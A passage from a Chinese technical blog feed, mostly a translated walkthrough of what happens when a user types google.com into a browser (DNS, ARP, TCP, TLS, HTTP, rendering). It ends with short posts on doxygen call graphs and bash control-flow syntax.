NSEvent被发往应用程序</h2><p>中断信号引发了I&#x2F;O Kit Kext键盘驱动的中断处理事件，驱动把信号翻译成键码值，然后传给OS X的 <code>WindowServer</code> 进程。然后， <code>WindowServer</code> 将这个事件通过Mach端口分发给合适的（活跃的，或者正在监听的）应用程序，这个信号会被放到应用程序的消息队列里。队列中的消息可以被拥有足够高权限的线程使用 <code>mach_ipc_dispatch</code> 函数读取到。这个过程通常是由 <code>NSApplication</code> 主事件循环产生并且处理的，通过 <code>NSEventType</code> 为 <code>KeyDown</code> 的 <code>NSEvent</code> 。</p><h2 id="GNU-Linux-Xorg-服务器监听键码值"><a href="#GNU-Linux-Xorg-服务器监听键码值" class="headerlink" title="(GNU&#x2F;Linux)Xorg 服务器监听键码值"></a>(GNU&#x2F;Linux)Xorg 服务器监听键码值</h2><p>当使用图形化的 X Server 时，X Server 会按照特定的规则把键码值再一次映射，映射成扫描码。当这个映射过程完成之后， X Server 把这个按键字符发送给窗口管理器(DWM，metacity, i3等等)，窗口管理器再把字符发送给当前窗口。当前窗口使用有关图形API把文字打印在输入框内。</p><h2 id="解析URL"><a href="#解析URL" class="headerlink" title="解析URL"></a>解析URL</h2><ul><li><p>浏览器通过 URL 能够知道下面的信息：</p><ul><li><code>Protocol</code> “http”<br>  使用HTTP协议</li><li><code>Resource</code> “&#x2F;“<br>  请求的资源是主页(index)</li></ul></li></ul><h2 id="输入的是-URL-还是搜索的关键字？"><a href="#输入的是-URL-还是搜索的关键字？" class="headerlink" title="输入的是 URL 还是搜索的关键字？"></a>输入的是 URL 还是搜索的关键字？</h2><p>当协议或主机名不合法时，浏览器会将地址栏中输入的文字传给默认的搜索引擎。大部分情况下，在把文字传递给搜索引擎的时候，URL会带有特定的一串字符，用来告诉搜索引擎这次搜索来自这个特定浏览器。</p><h2 id="转换非-ASCII-的-Unicode-字符"><a href="#转换非-ASCII-的-Unicode-字符" class="headerlink" title="转换非 ASCII 的 Unicode 字符"></a>转换非 ASCII 的 Unicode 字符</h2><ul><li>浏览器检查输入是否含有不是 <code>a-z</code>， <code>A-Z</code>，<code>0-9</code>， <code>-</code> 或者 <code>.</code> 的字符</li><li>这里主机名是 <code>google.com</code> ，所以没有非ASCII的字符；如果有的话，浏览器会对主机名部分使用 <code>Punycode</code>_  编码</li></ul><h2 id="检查-HSTS-列表"><a href="#检查-HSTS-列表" class="headerlink" title="检查 HSTS 列表"></a>检查 HSTS 列表</h2><ul><li>浏览器检查自带的“预加载 HSTS（HTTP严格传输安全）”列表，这个列表里包含了那些请求浏览器只使用HTTPS进行连接的网站</li><li>如果网站在这个列表里，浏览器会使用 HTTPS 而不是 HTTP 协议，否则，最初的请求会使用HTTP协议发送</li><li>注意，一个网站哪怕不在 HSTS 列表里，也可以要求浏览器对自己使用 HSTS 政策进行访问。浏览器向网站发出第一个 HTTP 请求之后，网站会返回浏览器一个响应，请求浏览器只使用 HTTPS 发送请求。然而，就是这第一个 HTTP 请求，却可能会使用户受到 <code>downgrade attack</code>_ 的威胁，这也是为什么现代浏览器都预置了 HSTS 列表。</li></ul><h2 id="DNS-查询"><a href="#DNS-查询" class="headerlink" title="DNS 查询"></a>DNS 查询</h2><ul><li><p>浏览器检查域名是否在缓存当中（要查看 Chrome 当中的缓存， 打开 <code>chrome://net-internals/#dns &lt;chrome://net-internals/#dns&gt;</code>_）。</p></li><li><p>如果缓存中没有，就去调用 <code>gethostbyname</code> 库函数（操作系统不同函数也不同）进行查询。</p></li><li><p><code>gethostbyname</code> 函数在试图进行DNS解析之前首先检查域名是否在本地 Hosts 里，Hosts 的位置 <code>不同的操作系统有所不同</code>_</p></li><li><p>如果 <code>gethostbyname</code> 没有这个域名的缓存记录，也没有在 <code>hosts</code> 里找到，它将会向 DNS 服务器发送一条 DNS 查询请求。DNS 服务器是由网络通信栈提供的，通常是本地路由器或者 ISP 的缓存 DNS 服务器。</p></li><li><p>查询本地 DNS 服务器</p></li><li><p>如果 DNS 服务器和我们的主机在同一个子网内，系统会按照下面的 ARP 过程对 DNS 服务器进行 ARP查询</p></li><li><p>如果 DNS 服务器和我们的主机在不同的子网，系统会按照下面的 ARP 过程对默认网关进行查询</p></li></ul><h2 id="ARP-过程"><a href="#ARP-过程" class="headerlink" title="ARP 过程"></a>ARP 过程</h2><p>要想发送 ARP（地址解析协议）广播，我们需要有一个目标 IP 地址，同时还需要知道用于发送 ARP 广播的接口的 MAC 地址。</p><ul><li>首先查询 ARP 缓存，如果缓存命中，我们返回结果：目标 IP &#x3D; MAC</li></ul><p>如果缓存没有命中：</p><ul><li>查看路由表，看看目标 IP 地址是不是在本地路由表中的某个子网内。是的话，使用跟那个子网相连的接口，否则使用与默认网关相连的接口。</li><li>查询选择的网络接口的 MAC 地址</li><li>我们发送一个二层（ <code>OSI 模型</code>_ 中的数据链路层）ARP 请求：</li></ul><p><code>ARP Request</code>::</p><pre><code class="hljs">Sender MAC: interface:mac:address:hereSender IP: interface.ip.goes.hereTarget MAC: FF:FF:FF:FF:FF:FF (Broadcast)Target IP: target.ip.goes.here</code></pre><p>根据连接主机和路由器的硬件类型不同，可以分为以下几种情况：</p><p>直连：</p><ul><li>如果我们和路由器是直接连接的，路由器会返回一个 <code>ARP Reply</code> （见下面）。</li></ul><p>集线器：</p><ul><li>如果我们连接到一个集线器，集线器会把 ARP 请求向所有其它端口广播，如果路由器也“连接”在其中，它会返回一个 <code>ARP Reply</code> 。</li></ul><p>交换机：</p><ul><li>如果我们连接到了一个交换机，交换机会检查本地 CAM&#x2F;MAC 表，看看哪个端口有我们要找的那个 MAC 地址，如果没有找到，交换机会向所有其它端口广播这个 ARP 请求。</li><li>如果交换机的 MAC&#x2F;CAM 表中有对应的条目，交换机会向有我们想要查询的 MAC 地址的那个端口发送 ARP 请求</li><li>如果路由器也“连接”在其中，它会返回一个 <code>ARP Reply</code></li></ul><p><code>ARP Reply</code>::</p><pre><code class="hljs">Sender MAC: target:mac:address:hereSender IP: target.ip.goes.hereTarget MAC: interface:mac:address:hereTarget IP: interface.ip.goes.here</code></pre><p>现在我们有了 DNS 服务器或者默认网关的 IP 地址，我们可以继续 DNS 请求了：</p><ul><li>使用 53 端口向 DNS 服务器发送 UDP 请求包，如果响应包太大，会使用 TCP 协议</li><li>如果本地&#x2F;ISP DNS 服务器没有找到结果，它会发送一个递归查询请求，一层一层向高层 DNS 服务器做查询，直到查询到起始授权机构，如果找到会把结果返回</li></ul><h2 id="使用套接字"><a href="#使用套接字" class="headerlink" title="使用套接字"></a>使用套接字</h2><p>当浏览器得到了目标服务器的 IP 地址，以及 URL 中给出来端口号（http 协议默认端口号是 80， https 默认端口号是 443），它会调用系统库函数 <code>socket</code> ，请求一个<br>TCP流套接字，对应的参数是 <code>AF_INET/AF_INET6</code> 和 <code>SOCK_STREAM</code> 。</p><ul><li>这个请求首先被交给传输层，在传输层请求被封装成 TCP segment。目标端口会被加入头部，源端口会在系统内核的动态端口范围内选取（Linux下是ip_local_port_range)</li><li>TCP segment 被送往网络层，网络层会在其中再加入一个 IP 头部，里面包含了目标服务器的IP地址以及本机的IP地址，把它封装成一个IP packet。</li><li>这个 TCP packet 接下来会进入链路层，链路层会在封包中加入 frame 头部，里面包含了本地内置网卡的MAC地址以及网关（本地路由器）的 MAC 地址。像前面说的一样，如果内核不知道网关的 MAC 地址，它必须进行 ARP 广播来查询其地址。</li></ul><p>到了现在，TCP 封包已经准备好了，可以使用下面的方式进行传输：</p><ul><li><code>以太网</code>_</li><li><code>WiFi</code>_</li><li><code>蜂窝数据网络</code>_</li></ul><p>对于大部分家庭网络和小型企业网络来说，封包会从本地计算机出发，经过本地网络，再通过调制解调器把数字信号转换成模拟信号，使其适于在电话线路，有线电视光缆和无线电话线路上传输。在传输线路的另一端，是另外一个调制解调器，它把模拟信号转换回数字信号，交由下一个 <code>网络节点</code>_ 处理。节点的目标地址和源地址将在后面讨论。</p><p>大型企业和比较新的住宅通常使用光纤或直接以太网连接，这种情况下信号一直是数字的，会被直接传到下一个 <code>网络节点</code>_ 进行处理。</p><p>最终封包会到达管理本地子网的路由器。在那里出发，它会继续经过自治区域(autonomous system, 缩写 AS)的边界路由器，其他自治区域，最终到达目标服务器。一路上经过的这些路由器会从IP数据报头部里提取出目标地址，并将封包正确地路由到下一个目的地。IP数据报头部 time to live (TTL) 域的值每经过一个路由器就减1，如果封包的TTL变为0，或者路由器由于网络拥堵等原因封包队列满了，那么这个包会被路由器丢弃。</p><p>上面的发送和接受过程在 TCP 连接期间会发生很多次：</p><ul><li>客户端选择一个初始序列号(ISN)，将设置了 SYN 位的封包发送给服务器端，表明自己要建立连接并设置了初始序列号</li><li>服务器端接收到 SYN 包，如果它可以建立连接：<ul><li>服务器端选择它自己的初始序列号</li><li>服务器端设置 SYN 位，表明自己选择了一个初始序列号</li><li>服务器端把 (客户端ISN + 1) 复制到 ACK 域，并且设置 ACK 位，表明自己接收到了客户端的第一个封包</li></ul></li><li>客户端通过发送下面一个封包来确认这次连接：<ul><li>自己的序列号+1</li><li>接收端 ACK+1</li><li>设置 ACK 位</li></ul></li><li>数据通过下面的方式传输：<ul><li>当一方发送了N个 Bytes 的数据之后，将自己的 SEQ 序列号也增加N</li><li>另一方确认接收到这个数据包（或者一系列数据包）之后，它发送一个 ACK 包，ACK 的值设置为接收到的数据包的最后一个序列号</li></ul></li><li>关闭连接时：<ul><li>要关闭连接的一方发送一个 FIN 包</li><li>另一方确认这个 FIN 包，并且发送自己的 FIN 包</li><li>要关闭的一方使用 ACK 包来确认接收到了 FIN</li></ul></li></ul><h2 id="TLS-握手"><a href="#TLS-握手" class="headerlink" title="TLS 握手"></a>TLS 握手</h2><ul><li>客户端发送一个 <code>ClientHello</code> 消息到服务器端，消息中同时包含了它的 Transport Layer Security (TLS) 版本，可用的加密算法和压缩算法。</li><li>服务器端向客户端返回一个 <code>ServerHello</code> 消息，消息中包含了服务器端的TLS版本，服务器所选择的加密和压缩算法，以及数字证书认证机构（Certificate Authority，缩写 CA）签发的服务器公开证书，证书中包含了公钥。客户端会使用这个公钥加密接下来的握手过程，直到协商生成一个新的对称密钥</li><li>客户端根据自己的信任CA列表，验证服务器端的证书是否可信。如果认为可信，客户端会生成一串伪随机数，使用服务器的公钥加密它。这串随机数会被用于生成新的对称密钥</li><li>服务器端使用自己的私钥解密上面提到的随机数，然后使用这串随机数生成自己的对称主密钥</li><li>客户端发送一个 <code>Finished</code> 消息给服务器端，使用对称密钥加密这次通讯的一个散列值</li><li>服务器端生成自己的 hash 值，然后解密客户端发送来的信息，检查这两个值是否对应。如果对应，就向客户端发送一个 <code>Finished</code> 消息，也使用协商好的对称密钥加密</li><li>从现在开始，接下来整个 TLS 会话都使用对称秘钥进行加密，传输应用层（HTTP）内容</li></ul><h2 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h2><p>如果浏览器是 Google 出品的，它不会使用 HTTP 协议来获取页面信息，而是会与服务器端发送请求，商讨使用 SPDY 协议。</p><p>如果浏览器使用 HTTP 协议而不支持 SPDY 协议，它会向服务器发送这样的一个请求::</p><pre><code class="hljs">GET / HTTP/1.1Host: google.comConnection: close[其他头部]</code></pre><p>“其他头部”包含了一系列的由冒号分割开的键值对，它们的格式符合HTTP协议标准，它们之间由一个换行符分割开来。（这里我们假设浏览器没有违反HTTP协议标准的bug，同时假设浏览器使用 <code>HTTP/1.1</code> 协议，不然的话头部可能不包含 <code>Host</code> 字段，同时 <code>GET</code> 请求中的版本号会变成 <code>HTTP/1.0</code> 或者 <code>HTTP/0.9</code> 。）</p><p>HTTP&#x2F;1.1 定义了“关闭连接”的选项 “close”，发送者使用这个选项指示这次连接在响应结束之后会断开。例如：</p><pre><code class="hljs">Connection:close</code></pre><p>不支持持久连接的 HTTP&#x2F;1.1 应用必须在每条消息中都包含 “close” 选项。</p><p>在发送完这些请求和头部之后，浏览器发送一个换行符，表示要发送的内容已经结束了。</p><p>服务器端返回一个响应码，指示这次请求的状态，响应的形式是这样的::</p><pre><code class="hljs">200 OK[响应头部]</code></pre><p>然后是一个换行，接下来有效载荷(payload)，也就是 <code>www.google.com</code> 的HTML内容。服务器下面可能会关闭连接，如果客户端请求保持连接的话，服务器端会保持连接打开，以供之后的请求重用。</p><p>如果浏览器发送的HTTP头部包含了足够多的信息（例如包含了 Etag 头部），以至于服务器可以判断出，浏览器缓存的文件版本自从上次获取之后没有再更改过，服务器可能会返回这样的响应::</p><pre><code class="hljs">304 Not Modified[响应头部]</code></pre><p>这个响应没有有效载荷，浏览器会从自己的缓存中取出想要的内容。</p><p>在解析完 HTML 之后，浏览器和客户端会重复上面的过程，直到HTML页面引入的所有资源（图片，CSS，favicon.ico等等）全部都获取完毕，区别只是头部的 <code>GET / HTTP/1.1</code> 会变成 <code>GET /$(相对www.google.com的URL) HTTP/1.1</code> 。</p><p>如果HTML引入了 <code>www.google.com</code> 域名之外的资源，浏览器会回到上面解析域名那一步，按照下面的步骤往下一步一步执行，请求中的 <code>Host</code> 头部会变成另外的域名。</p><h2 id="HTTP-服务器请求处理"><a href="#HTTP-服务器请求处理" class="headerlink" title="HTTP 服务器请求处理"></a>HTTP 服务器请求处理</h2><p>HTTPD(HTTP Daemon)在服务器端处理请求&#x2F;响应。最常见的 HTTPD 有 Linux 上常用的 Apache 和 nginx，以及 Windows 上的 IIS。</p><ul><li>HTTPD 接收请求</li><li>服务器把请求拆分为以下几个参数：<ul><li>HTTP 请求方法(<code>GET</code>, <code>POST</code>, <code>HEAD</code>, <code>PUT</code>, <code>DELETE</code>, <code>CONNECT</code>, <code>OPTIONS</code>, 或者 <code>TRACE</code>)。直接在地址栏中输入 URL 这种情况下，使用的是 GET 方法</li><li>域名：google.com</li><li>请求路径&#x2F;页面：&#x2F;  (我们没有请求google.com下的指定的页面，因此 &#x2F; 是默认的路径)</li></ul></li><li>服务器验证其上已经配置了 google.com 的虚拟主机</li><li>服务器验证 google.com 接受 GET 方法</li><li>服务器验证该用户可以使用 GET 方法(根据 IP 地址，身份信息等)</li><li>如果服务器安装了 URL 重写模块（例如 Apache 的 mod_rewrite 和 IIS 的 URL Rewrite），服务器会尝试匹配重写规则，如果匹配上的话，服务器会按照规则重写这个请求</li><li>服务器根据请求信息获取相应的响应内容，这种情况下由于访问路径是 “&#x2F;“ ,会访问首页文件（你可以重写这个规则，但是这个是最常用的）。</li><li>服务器会使用指定的处理程序分析处理这个文件，假如 Google 使用 PHP，服务器会使用 PHP 解析 index 文件，并捕获输出，把 PHP 的输出结果返回给请求者</li></ul><h2 id="浏览器背后的故事"><a href="#浏览器背后的故事" class="headerlink" title="浏览器背后的故事"></a>浏览器背后的故事</h2><p>当服务器提供了资源之后（HTML，CSS，JS，图片等），浏览器会执行下面的操作：</p><ul><li>解析 —— HTML，CSS，JS</li><li>渲染 —— 构建 DOM 树 -&gt; 渲染 -&gt; 布局 -&gt; 绘制</li></ul><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>浏览器的功能是从服务器上取回你想要的资源，然后展示在浏览器窗口当中。资源通常是 HTML 文件，也可能是 PDF，图片，或者其他类型的内容。资源的位置通过用户提供的 URI(Uniform Resource Identifier) 来确定。</p><p>浏览器解释和展示 HTML 文件的方法，在 HTML 和 CSS 的标准中有详细介绍。这些标准由 Web 标准组织 W3C(World Wide Web Consortium) 维护。</p><p>不同浏览器的用户界面大都十分接近，有很多共同的 UI 元素：</p><ul><li>一个地址栏</li><li>后退和前进按钮</li><li>书签选项</li><li>刷新和停止按钮</li><li>主页按钮</li></ul><p><strong>浏览器高层架构</strong></p><p>组成浏览器的组件有：</p><ul><li><strong>用户界面</strong> 用户界面包含了地址栏，前进后退按钮，书签菜单等等，除了请求页面之外所有你看到的内容都是用户界面的一部分</li><li><strong>浏览器引擎</strong> 浏览器引擎负责让 UI 和渲染引擎协调工作</li><li><strong>渲染引擎</strong> 渲染引擎负责展示请求内容。如果请求的内容是 HTML，渲染引擎会解析 HTML 和 CSS，然后将内容展示在屏幕上</li><li><strong>网络组件</strong> 网络组件负责网络调用，例如 HTTP 请求等，使用一个平台无关接口，下层是针对不同平台的具体实现</li><li><strong>UI后端</strong> UI 后端用于绘制基本 UI 组件，例如下拉列表框和窗口。UI 后端暴露一个统一的平台无关的接口，下层使用操作系统的 UI 方法实现</li><li><strong>Javascript 引擎</strong> Javascript 引擎用于解析和执行 Javascript 代码</li><li><strong>数据存储</strong> 数据存储组件是一个持久层。浏览器可能需要在本地存储各种各样的数据，例如 Cookie 等。浏览器也需要支持诸如 localStorage，IndexedDB，WebSQL 和 FileSystem 之类的存储机制</li></ul><h2 id="HTML-解析"><a href="#HTML-解析" class="headerlink" title="HTML 解析"></a>HTML 解析</h2><p>浏览器渲染引擎从网络层取得请求的文档，一般情况下文档会分成8kB大小的分块传输。</p><p>HTML 解析器的主要工作是对 HTML 文档进行解析，生成解析树。</p><p>解析树是以 DOM 元素以及属性为节点的树。DOM是文档对象模型(Document Object Model)的缩写，它是 HTML 文档的对象表示，同时也是 HTML 元素面向外部(如Javascript)的接口。树的根部是”Document”对象。整个 DOM 和 HTML 文档几乎是一对一的关系。</p><p><strong>解析算法</strong></p><p>HTML不能使用常见的自顶向下或自底向上方法来进行分析。主要原因有以下几点:</p><ul><li>语言本身的“宽容”特性</li><li>HTML 本身可能是残缺的，对于常见的残缺，浏览器需要有传统的容错机制来支持它们</li><li>解析过程需要反复。对于其他语言来说，源码不会在解析过程中发生变化，但是对于 HTML 来说，动态代码，例如脚本元素中包含的 <code>document.write()</code> 方法会在源码中添加内容，也就是说，解析过程实际上会改变输入的内容</li></ul><p>由于不能使用常用的解析技术，浏览器创造了专门用于解析 HTML 的解析器。解析算法在 HTML5 标准规范中有详细介绍，算法主要包含了两个阶段：标记化（tokenization）和树的构建。</p><p><strong>解析结束之后</strong></p><p>浏览器开始加载网页的外部资源（CSS，图像，Javascript 文件等）。</p><p>此时浏览器把文档标记为可交互的（interactive），浏览器开始解析处于“推迟（deferred）”模式的脚本，也就是那些需要在文档解析完毕之后再执行的脚本。之后文档的状态会变为“完成（complete）”，浏览器会触发“加载（load）”事件。</p><p>注意解析 HTML 网页时永远不会出现“无效语法（Invalid Syntax）”错误，浏览器会修复所有错误内容，然后继续解析。</p><h2 id="CSS-解析"><a href="#CSS-解析" class="headerlink" title="CSS 解析"></a>CSS 解析</h2><ul><li>根据 <code>CSS词法和句法</code>_ 分析CSS文件和 <code>&lt;style&gt;</code> 标签包含的内容以及 <code>style</code> 属性的值</li><li>每个CSS文件都被解析成一个样式表对象（<code>StyleSheet object</code>），这个对象里包含了带有选择器的CSS规则，和对应CSS语法的对象</li><li>CSS解析器可能是自顶向下的，也可能是使用解析器生成器生成的自底向上的解析器</li></ul><h2 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h2><ul><li>通过遍历DOM节点树创建一个“Frame 树”或“渲染树”，并计算每个节点的各个CSS样式值</li><li>通过累加子节点的宽度，该节点的水平内边距(padding)、边框(border)和外边距(margin)，自底向上的计算”Frame 树”中每个节点的首选(preferred)宽度</li><li>通过自顶向下的给每个节点的子节点分配可行宽度，计算每个节点的实际宽度</li><li>通过应用文字折行、累加子节点的高度和此节点的内边距(padding)、边框(border)和外边距(margin)，自底向上的计算每个节点的高度</li><li>使用上面的计算结果构建每个节点的坐标</li><li>当存在元素使用 <code>floated</code>，位置有 <code>absolutely</code> 或 <code>relatively</code> 属性的时候，会有更多复杂的计算，详见<a href="http://dev.w3.org/csswg/css2/">http://dev.w3.org/csswg/css2/</a> 和 <a href="http://www.w3.org/Style/CSS/current-work">http://www.w3.org/Style/CSS/current-work</a></li><li>创建layer(层)来表示页面中的哪些部分可以成组的被绘制，而不用被重新栅格化处理。每个帧对象都被分配给一个层</li><li>页面上的每个层都被分配了纹理(?)</li><li>每个层的帧对象都会被遍历，计算机执行绘图命令绘制各个层，此过程可能由CPU执行栅格化处理，或者直接通过D2D&#x2F;SkiaGL在GPU上绘制</li><li>上面所有步骤都可能利用到最近一次页面渲染时计算出来的各个值，这样可以减少不少计算量</li><li>计算出各个层的最终位置，一组命令由 Direct3D&#x2F;OpenGL发出，GPU命令缓冲区清空，命令传至GPU并异步渲染，帧被送到Window Server。</li></ul><h2 id="GPU-渲染"><a href="#GPU-渲染" class="headerlink" title="GPU 渲染"></a>GPU 渲染</h2><ul><li>在渲染过程中，图形处理层可能使用通用用途的 <code>CPU</code>，也可能使用图形处理器 <code>GPU</code></li><li>当使用 <code>GPU</code> 用于图形渲染时，图形驱动软件会把任务分成多个部分，这样可以充分利用 <code>GPU</code> 强大的并行计算能力，用于在渲染过程中进行大量的浮点计算。</li></ul><h2 id="Window-Server"><a href="#Window-Server" class="headerlink" title="Window Server"></a>Window Server</h2><h2 id="后期渲染与用户引发的处理"><a href="#后期渲染与用户引发的处理" class="headerlink" title="后期渲染与用户引发的处理"></a>后期渲染与用户引发的处理</h2><p>渲染结束后，浏览器根据某些时间机制运行JavaScript代码(比如Google Doodle动画)或与用户交互(在搜索栏输入关键字获得搜索建议)。类似Flash和Java的插件也会运行，尽管Google主页里没有。这些脚本可以触发网络请求，也可能改变网页的内容和布局，产生又一轮渲染与绘制。</p><h1 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h1><p><code>Creative Commons Zero</code>: <a href="https://creativecommons.org/publicdomain/zero/1.0/">https://creativecommons.org/publicdomain/zero/1.0/</a></p><p><code>CSS词法和句法</code>: <a href="http://www.w3.org/TR/CSS2/grammar.html">http://www.w3.org/TR/CSS2/grammar.html</a></p><p><code>Punycode</code>: <a href="https://en.wikipedia.org/wiki/Punycode">https://en.wikipedia.org/wiki/Punycode</a></p><p><code>以太网</code>: <a href="http://en.wikipedia.org/wiki/IEEE_802.3">http://en.wikipedia.org/wiki/IEEE_802.3</a></p><p><code>WiFi</code>: <a href="https://en.wikipedia.org/wiki/IEEE_802.11">https://en.wikipedia.org/wiki/IEEE_802.11</a></p><p><code>蜂窝数据网络</code>: <a href="https://en.wikipedia.org/wiki/Cellular_data_communication_protocol">https://en.wikipedia.org/wiki/Cellular_data_communication_protocol</a></p><p><code>analog-to-digital converter</code>: <a href="https://en.wikipedia.org/wiki/Analog-to-digital_converter">https://en.wikipedia.org/wiki/Analog-to-digital_converter</a></p><p><code>网络节点</code>: <a href="https://en.wikipedia.org/wiki/Computer_network#Network_nodes">https://en.wikipedia.org/wiki/Computer_network#Network_nodes</a></p><p><code>不同的操作系统有所不同</code> : <a href="https://en.wikipedia.org/wiki/Hosts_%28file%29#Location_in_the_file_system">https://en.wikipedia.org/wiki/Hosts_%28file%29#Location_in_the_file_system</a></p><p><code>downgrade attack</code>: <a href="http://en.wikipedia.org/wiki/SSL_stripping">http://en.wikipedia.org/wiki/SSL_stripping</a></p><p><code>OSI 模型</code>: <a href="https://en.wikipedia.org/wiki/OSI_model">https://en.wikipedia.org/wiki/OSI_model</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记使用doxygen graphviz绘制函数调用图</title>
    <link href="/2023/12/13/%E8%AE%B0%E4%BD%BF%E7%94%A8doxygen%20graphviz%E7%BB%98%E5%88%B6%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%9B%BE/"/>
    <url>/2023/12/13/%E8%AE%B0%E4%BD%BF%E7%94%A8doxygen%20graphviz%E7%BB%98%E5%88%B6%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p>记使用doxygen graphviz绘制函数调用图</p><span id="more"></span><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312131332913.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/benkaoya/article/details/79763668">https://blog.csdn.net/benkaoya/article/details/79763668</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash语句总结</title>
    <link href="/2023/12/12/bash%E8%AF%AD%E5%8F%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/12/bash%E8%AF%AD%E5%8F%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>shell逻辑语句总结</p><span id="more"></span><h1 id="if-else-elif"><a href="#if-else-elif" class="headerlink" title="if else elif"></a>if else elif</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> expr1<br><span class="hljs-keyword">then</span><br>commands<br><span class="hljs-keyword">elif</span> expr2<br><span class="hljs-keyword">then</span><br>commands<br><span class="hljs-keyword">else</span><br>commands<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122335256.png"></p><hr><h1 id="while"><a href="#while" class="headerlink" title="while"></a>while</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">expr</span><br><span class="hljs-keyword">do</span><br>commands<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122336278.png"></p><h1 id="for"><a href="#for" class="headerlink" title="for"></a>for</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> lists<br><span class="hljs-keyword">do</span><br>commands<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122338302.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122342160.png"></p><h1 id="case"><a href="#case" class="headerlink" title="case"></a>case</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">case</span> <span class="hljs-built_in">expr</span> <span class="hljs-keyword">in</span><br>pattern1)<br>commands<br>;;<br>pattern2)<br>commands<br>;;<br>*)<br>commands<br>;;<br>esca<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122339469.png"></p><h1 id="until"><a href="#until" class="headerlink" title="until"></a>until</h1><p>和while差不多但是，当为错误时进入循环，而不是正确进入循环</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">until</span> <span class="hljs-built_in">expr</span><br><span class="hljs-keyword">do</span> <br>commands<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h1 id="break-continue"><a href="#break-continue" class="headerlink" title="break&amp;continue"></a>break&amp;continue</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> [n]<br><br><span class="hljs-built_in">continue</span> [n]<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122345660.png"></p><h1 id="select"><a href="#select" class="headerlink" title="select"></a>select</h1><p>实际上这并不是一个逻辑语句，其主要用于创建菜单。并且其是一个死循环，记得使用<code>break</code>语句来退出循环。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> x <span class="hljs-keyword">in</span> lists<br><span class="hljs-keyword">do</span><br>commands<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122346744.png"></p><h1 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">shift</span> [n]<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312122347773.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect12_Shell_Prog.pdf">https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect12_Shell_Prog.pdf</a></p><p><a href="https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect14_Review.pdf">https://math.ecnu.edu.cn/~jypan/Teaching/Linux/Linux08/lect14_Review.pdf</a></p>]]></content>
    
    
